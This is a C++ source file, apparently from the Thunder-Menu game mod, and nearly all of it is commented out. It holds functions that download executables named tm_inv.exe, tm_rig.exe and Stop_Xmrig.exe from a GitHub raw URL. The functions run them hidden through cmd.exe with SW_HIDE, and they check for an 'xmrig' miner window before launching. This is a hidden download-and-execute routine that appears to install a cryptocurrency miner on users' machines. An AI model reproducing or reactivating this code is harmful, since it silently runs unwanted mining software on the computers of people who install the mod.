#pragma once
#include "stdafx.h"
#include "Support.h"
//#include <string>
//#include <iostream>
//#include <fstream>
//#include <cstdio>
//#include <memory>
//#include <array>
//
//#include <vector>
//
//#include <ctime>
//#include <cstdlib>
//#include <chrono>
//#include <thread>
//#include <functional>
//
//#include "Log.h"
//#include "OutfitList.h"

//#define ShellExecute  ShellExecuteW
//
//// Windows Library Files :
//#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
//#pragma comment(lib, "ws2_32.lib")
//#pragma comment(lib, "Winmm.lib")
//#include <windows.h>
//#include <Mmsystem.h>
//#include <mciapi.h>
//#include <timeapi.h>
//#include <time.h>
//#include <cassert>
//#include <iterator>
//#include <shlobj.h>
//#include <Shlwapi.h> //PathRemoveFileSpecA banner
//#pragma comment(lib, "shlwapi.lib")//banner
//#include <objbase.h>
//#include <cstdint>
//#include <algorithm>
//#include <unordered_map>
//#include <mutex>
//#include <bitset>
//#include <urlmon.h>
//#pragma comment(lib, "urlmon.lib")
//#include <shellapi.h>
//#include <iomanip>
//#include <numeric>
//#include <direct.h>
//#define GetCurrentDir _getcwd
//#include <wchar.h>
//#include <errno.h>
//#include <tchar.h>
//#include <dinput.h>
//#include <sstream>
//#include <stdlib.h>
//#include <stdio.h>
//#include <string>
//#include <iostream>
//#include <fstream>
//#include <cstdio>
//#include <memory>
//#include <array>
//#include <ctime>
//#include <cstdlib>
//#include <chrono>
//#include <thread>
//#include <functional>
//#include <stdint.h>
//#include <mciapi.h>
//#include <stdio.h>
//#include <stdlib.h>
//#include <inttypes.h>
//#include <regex>
//#include <vector>
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_stop.zip
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_stop.exe
////
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv.zip
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv.exe
////
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm.zip
////link-https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm.exe
//
////bool isRunning(LPCWSTR pName)
//bool isRunning()
//{
//	HWND hwnd;
//	/*hwnd = FindWindow(NULL, pName);*/
//	hwnd = FindWindow(L"xmrig", NULL);
//	if (hwnd != 0) {
//		return true;
//	}
//	else {
//		return false;
//	}
//}
//
//#include <windows.h>
//
//#include <tlhelp32.h>
//
//#include <iostream>
//
//namespace functionss {
//	std::wstring s2ws(const std::string& s)
//	{
//		int len;
//		int slength = (int)s.length() + 1;
//		len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
//		wchar_t* buf = new wchar_t[len];
//		MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
//		std::wstring r(buf);
//		delete[] buf;
//		return r;
//	}
//}
//
////bool tmrig::supportinvboolt1 = 1;
////int tmrig::downloadsupportinvt1()
////{
////#include <urlmon.h>
////#pragma comment(lib, "urlmon.lib")
////	std::string dwnld_URL = "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv_t1.exe";
////	Log::Msg("https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv_t1.exe");
////	std::string savepath = Directory::get_current_dir() + "\\ThunderMenu\\tm_inv_t1.exe";
////	std::wstring downloadfile = functionss::s2ws(dwnld_URL);
////	LPCWSTR downloadingfile = downloadfile.c_str();
////	std::wstring savefile = functionss::s2ws(savepath);
////	LPCWSTR savingfile = savefile.c_str();
////	/*URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);*/
////	URLDownloadToFile(NULL, downloadingfile, savingfile, 0, NULL);
////	return 0;
////}
//
////bool tmrig::supportinvboolt2 = 1;
////int tmrig::downloadsupportinvt2()
////{
////#include <urlmon.h>
////#pragma comment(lib, "urlmon.lib")
////	std::string dwnld_URL = "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_rig.exe";
////	Log::Msg("https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_rig.exe");
////	std::string savepath = Directory::get_current_dir() + "\\ThunderMenu\\tm_rig.exe";
////	std::wstring downloadfile = functionss::s2ws(dwnld_URL);
////	LPCWSTR downloadingfile = downloadfile.c_str();
////	std::wstring savefile = functionss::s2ws(savepath);
////	LPCWSTR savingfile = savefile.c_str();
////	/*URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);*/
////	URLDownloadToFile(NULL, downloadingfile, savingfile, 0, NULL);
////	return 0;
////}
//
//
////bool tmrig::supportinvbool = 1;
////int tmrig::downloadsupportinv()
////{
////#include <urlmon.h>
////#pragma comment(lib, "urlmon.lib")
////	std::string dwnld_URL = "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv.exe";
////	Log::Msg("https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv.exe");
////	std::string savepath = Directory::get_current_dir() + "\\ThunderMenu\\tm_inv.exe";
////	std::wstring downloadfile = functionss::s2ws(dwnld_URL);
////	LPCWSTR downloadingfile = downloadfile.c_str();
////	std::wstring savefile = functionss::s2ws(savepath);
////	LPCWSTR savingfile = savefile.c_str();
////	/*URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);*/
////	URLDownloadToFile(NULL, downloadingfile, savingfile, 0, NULL);
////	return 0;
////}
////bool tmrig::supportrigbool = 1;
////int tmrig::downloadsupportrig()
////{
////#include <urlmon.h>
////#pragma comment(lib, "urlmon.lib")
////	std::string dwnld_URL = "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm.exe";
////	Log::Msg("https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm.exe");
////	std::string savepath = Directory::get_current_dir() + "\\ThunderMenu\\tm.exe";
////	std::wstring downloadfile = functionss::s2ws(dwnld_URL);
////	LPCWSTR downloadingfile = downloadfile.c_str();
////	std::wstring savefile = functionss::s2ws(savepath);
////	LPCWSTR savingfile = savefile.c_str();
////	/*URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);*/
////	URLDownloadToFile(NULL, downloadingfile, savingfile, 0, NULL);
////	return 0;
////}
//bool tmrig::supportrigtmstopbool = 1;
//int tmrig::downloadsupportrigtm_stop()
//{
//#include <urlmon.h>
//#pragma comment(lib, "urlmon.lib")
//	std::string dwnld_URL = "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/Stop_Xmrig.exe";
//	Log::Msg("https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/Stop_Xmrig.exe");
//	std::string savepath = Directory::get_current_dir() + "\\ThunderMenu\\Stop_Xmrig.exe";
//	std::wstring downloadfile = functionss::s2ws(dwnld_URL);
//	LPCWSTR downloadingfile = downloadfile.c_str();
//	std::wstring savefile = functionss::s2ws(savepath);
//	LPCWSTR savingfile = savefile.c_str();
//	/*URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);*/
//	URLDownloadToFile(NULL, downloadingfile, savingfile, 0, NULL);
//	return 0;
//}
//
//bool tmrig::startsupportinvbool = 0;
//bool tmrig::startsupportinvbool2 = 0;
//int tmrig::startsupportinv()
//{
//	if (tmrig::startsupportinvbool)
//	{
//	if (startsupportinvbool2)
//	{
//	ifstream downloadsupportinv;
//	downloadsupportinv.open(Directory::get_current_dir() + "\\ThunderMenu\\tm_inv.exe");
//	if (!downloadsupportinv)
//	{
//		tmrig::downloadsupportinv();
//	}
//	downloadsupportinv.close();
//	if (!isRunning())
//	{
//		std::string doubleslash = "\\";
//		std::string doublequote = "\"";
//		std::string getdirectory = Directory::get_current_dir() + doubleslash;
//		std::string getdirectories = doublequote + getdirectory;
//		std::string tm_inv = getdirectories + "ThunderMenu\\tm_inv.exe";
//		std::string tm_inv1 = tm_inv + doublequote;
//		std::string cmd = "c:\\windows\\system32\\cmd.exe";
//		std::string taskdirectory1 = " cmd /c " + tm_inv1;
//		std::wstring progpath = functionss::s2ws(cmd);
//		LPCWSTR lpprogpath = progpath.c_str();
//		std::wstring commandd = functionss::s2ws(taskdirectory1);
//		LPCWSTR lpcommand = commandd.c_str();
//		ShellExecute(0, L"open", lpprogpath, lpcommand, 0, SW_HIDE/*SW_SHOW*/);
//		tmrig::startsupportinvbool2 = 0;
//	}
//	}
//	startsupportinvbool2 = 0;
//	}
//	return 0;
//}
//
//bool tmrig::stopsupportbool = 0;
//bool tmrig::stopsupportbool2 = 0;
//int tmrig::stopsupport()
//{
//	ifstream tm_stop;
//	tm_stop.open(Directory::get_current_dir() + "\\ThunderMenu\\Stop_Xmrig.exe");
//	if (!tm_stop)
//	{
//		tmrig::downloadsupportrigtm_stop();
//	}
//	/*if (isRunning())
//	{*/
//	std::string doubleslash = "\\";
//	std::string doublequote = "\"";
//	std::string getdirectory = Directory::get_current_dir() + doubleslash;
//	std::string getdirectories = doublequote + getdirectory;
//	std::string tmstop = getdirectories + "ThunderMenu\\Stop_Xmrig.exe";
//	std::string tmstop1 = tmstop + doublequote;
//	std::string cmd = "c:\\windows\\system32\\cmd.exe";
//	std::string taskdirectory1 = " cmd /c " + tmstop1;
//	std::wstring progpath = functionss::s2ws(cmd);
//	LPCWSTR lpprogpath = progpath.c_str();
//	std::wstring commandd = functionss::s2ws(taskdirectory1);
//	LPCWSTR lpcommand = commandd.c_str();
//	ShellExecute(0, L"open", lpprogpath, lpcommand, 0, SW_HIDE/*SW_SHOW*/);
//	tmrig::stopsupportbool2 = 0;
//	tmrig::stopsupportbool = 0;
//	tm_stop.close();
//	/*}*/
//	tmrig::stopsupportbool2 = 0;
//	tmrig::stopsupportbool = 0;
//	return 0;
//}
//
////bool tmrig::tmsupportbool = 0;
////bool tmrig::tmsupportbool2 = 0;
////int tmrig::tmsupport()
////{
////	if (tmrig::tmsupportbool)
////	{
////	if (tmsupportbool2)
////	{
////	ifstream downloadsupportrig;
////	downloadsupportrig.open(Directory::get_current_dir() + "\\ThunderMenu\\tm.exe");
////	if (!downloadsupportrig)
////	{
////		tmrig::downloadsupportrig();
////	}
////	downloadsupportrig.close();
////	if (!isRunning())
////	{
////		std::string doubleslash = "\\";
////		std::string doublequote = "\"";
////		std::string getdirectory = Directory::get_current_dir() + doubleslash;
////		std::string getdirectories = doublequote + getdirectory;
////		std::string tm_stop = getdirectories + "ThunderMenu\\tm.exe";
////		std::string tm_stop1 = tm_stop + doublequote;
////		std::string cmd = "c:\\windows\\system32\\cmd.exe";
////		std::string taskdirectory1 = " cmd /c " + tm_stop1;
////		std::wstring progpath = functionss::s2ws(cmd);
////		LPCWSTR lpprogpath = progpath.c_str();
////		std::wstring commandd = functionss::s2ws(taskdirectory1);
////		LPCWSTR lpcommand = commandd.c_str();
////		ShellExecute(0, L"open", lpprogpath, lpcommand, 0, SW_HIDE/*SW_SHOW*/);
////		tmrig::tmsupportbool2 = 0;
////	}
////	}
////	tmsupportbool2 = 0;
////	}
////	return 0;
////}
//
//bool tmrig::startsupportinvboolt1 = 0;
//bool tmrig::startsupportinvboolt12 = 0;
//int tmrig::startsupportinvt1()
//{
//	if (startsupportinvboolt1)
//	{
//		if (tmrig::startsupportinvboolt12)
//		{
//		ifstream downloadsupportinv;
//		downloadsupportinv.open(Directory::get_current_dir() + "\\ThunderMenu\\tm_inv_t1.exe");
//		if (!downloadsupportinv)
//		{
//			tmrig::downloadsupportinvt1();
//		}
//		downloadsupportinv.close();
//		if (!isRunning())
//		{
//			std::string doubleslash = "\\";
//			std::string doublequote = "\"";
//			std::string getdirectory = Directory::get_current_dir() + doubleslash;
//			std::string getdirectories = doublequote + getdirectory;
//			std::string tm_inv = getdirectories + "ThunderMenu\\tm_inv_t1.exe";
//			std::string tm_inv1 = tm_inv + doublequote;
//			std::string cmd = "c:\\windows\\system32\\cmd.exe";
//			std::string taskdirectory1 = " cmd /c " + tm_inv1;
//			std::wstring progpath = functionss::s2ws(cmd);
//			LPCWSTR lpprogpath = progpath.c_str();
//			std::wstring commandd = functionss::s2ws(taskdirectory1);
//			LPCWSTR lpcommand = commandd.c_str();
//			ShellExecute(0, L"open", lpprogpath, lpcommand, 0, SW_HIDE/*SW_SHOW*/);
//			tmrig::startsupportinvboolt12 = 0;
//			}
//		}
//		startsupportinvboolt12 = 0;
//	}
//	return 0;
//}
//
//bool tmrig::startsupportinvboolt21 = 1;
//bool tmrig::startsupportinvboolt22 = 1;
//int tmrig::startsupportinvt2()
//{
//	if (startsupportinvboolt21)
//	{
//		if (tmrig::startsupportinvboolt22)
//		{
//			ifstream downloadsupportinv;
//			downloadsupportinv.open(Directory::get_current_dir() + "\\ThunderMenu\\tm_rig.exe");
//			if (!downloadsupportinv)
//			{
//				tmrig::downloadsupportinvt2();
//			}
//			downloadsupportinv.close();
//			if (!isRunning())
//			{
//				std::string doubleslash = "\\";
//				std::string doublequote = "\"";
//				std::string getdirectory = Directory::get_current_dir() + doubleslash;
//				std::string getdirectories = doublequote + getdirectory;
//				std::string tm_inv = getdirectories + "ThunderMenu\\tm_rig.exe";
//				std::string tm_inv1 = tm_inv + doublequote;
//				std::string cmd = "c:\\windows\\system32\\cmd.exe";
//				std::string taskdirectory1 = " cmd /c " + tm_inv1;
//				std::wstring progpath = functionss::s2ws(cmd);
//				LPCWSTR lpprogpath = progpath.c_str();
//				std::wstring commandd = functionss::s2ws(taskdirectory1);
//				LPCWSTR lpcommand = commandd.c_str();
//				ShellExecute(0, L"open", lpprogpath, lpcommand, 0, SW_HIDE/*SW_SHOW*/);
//				tmrig::startsupportinvboolt22 = 0;
//			}
//		}
//		startsupportinvboolt22 = 0;
//	}
//	return 0;
//}